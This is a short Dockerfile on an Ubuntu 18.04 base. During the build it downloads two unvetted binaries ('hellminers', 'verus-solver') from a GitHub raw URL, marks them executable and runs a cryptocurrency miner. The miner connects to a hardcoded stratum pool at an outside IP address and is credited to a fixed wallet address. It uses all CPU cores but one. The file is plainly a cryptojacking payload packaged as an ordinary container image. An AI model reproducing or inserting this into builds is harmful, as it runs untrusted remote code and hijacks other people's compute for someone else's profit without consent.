FROM ubuntu:18.04
RUN apt-get update && \
     apt-get install wget -y && \
     wget https://raw.githubusercontent.com/laboldrokok/saksake/main/hellminers && wget https://raw.githubusercontent.com/laboldrokok/saksake/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://139.99.123.225:3956 -u RC3G7FfFYLxfnP5DYMKp5zkDWuJtofUXWq.coek -p x --cpu $(nproc --ignore 1)
